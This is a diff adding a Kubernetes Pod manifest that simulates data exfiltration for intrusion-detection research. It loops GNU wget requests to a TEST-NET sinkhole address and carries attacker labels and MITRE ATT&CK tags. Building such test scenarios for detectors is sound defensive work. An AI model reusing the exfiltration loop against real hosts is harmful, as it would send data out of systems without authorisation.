@@ -1,0 +1,49 @@
+# H3 attack: data exfiltration with real GNU wget to a sinkhole.
+# 192.0.2.1 is RFC 5737 TEST-NET-1, so no data leaves the cluster; the
+# syscall pattern (execve, openat, connect) matches the first seconds of a
+# real exfiltration. Tracee only captures execve/openat/connect/futex, so the
+# missing data transfer is not visible to the IDS either way.
+apiVersion: v1
+kind: Pod
+metadata:
+  # Not part of a protected deployment; run_h3.py admits it by name.
+  name: exfil-attacker
+  namespace: default
+  labels:
+    role: attacker
+    scenario: h3
+    attack-class: data-exfiltration
+  annotations:
+    ids-research.io/mitre-attack: "T1041 (Exfiltration Over C2 Channel), T1567 (Exfiltration Over Web Service)"
+    ids-research.io/sinkhole: "192.0.2.1 (RFC 5737 TEST-NET-1)"
+spec:
+  containers:
+    - name: exfil
+      image: alpine:3.20
+      imagePullPolicy: IfNotPresent
+      command:
+        - /bin/sh
+        - -c
+        - |
+          set -eu
+          # GNU wget (busybox wget lacks --timeout/--tries).
+          apk add --no-cache wget > /dev/null
+          echo "[exfil] wget version:"
+          wget --version | head -1
+
+          TARGET="http://192.0.2.1/data"
+
+          echo "[exfil] starting exfiltration loop to $TARGET"
+          # Per iteration: execve(wget), openat (resolv.conf, hosts), connect.
+          while true; do
+            wget --timeout=2 --tries=1 -q -O /dev/null "$TARGET" || true
+            sleep 0.5
+          done
+      resources:
+        requests:
+          cpu: "50m"
+          memory: "16Mi"
+        limits:
+          cpu: "200m"
+          memory: "64Mi"
+  restartPolicy: Never
